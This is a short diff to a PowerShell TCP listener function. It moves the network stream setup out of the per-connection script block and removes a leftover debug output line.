@@ -52,7 +52,7 @@ Function Global:New-Listerner()
 		
 		if($client = $listener.AcceptTcpClient())
 		{
-
+			$Stream = $client.GetStream()
 			# add agent to listerner
 			#$thisListerner = Get-Listerner -UUID ($obj.UUID.toString())
 			#$agentCount    = $thisListerner.AGENTCOUNT++
@@ -70,7 +70,7 @@ Function Global:New-Listerner()
 
 			# build our logic for  onboarding connections
 			[void]$PowerShell.AddScript({
-				$Stream = $client.GetStream()
+				
 				$StreamWriter = New-Object System.IO.StreamWriter($Stream)
 				$StreamReader = New-Object System.IO.StreamReader($Stream)
 
@@ -92,7 +92,7 @@ Function Global:New-Listerner()
 				$StreamWriter.Close()
 
 			})
-			$AsyncObject = $PowerShell.BeginInvoke($client)
+			$AsyncObject = $PowerShell.BeginInvoke($Stream)
 			"sock!"
 		}
 		
@@ -101,7 +101,6 @@ Function Global:New-Listerner()
 		
 	}
 	$listener.Stop();
-	"5"
 	
 
 }
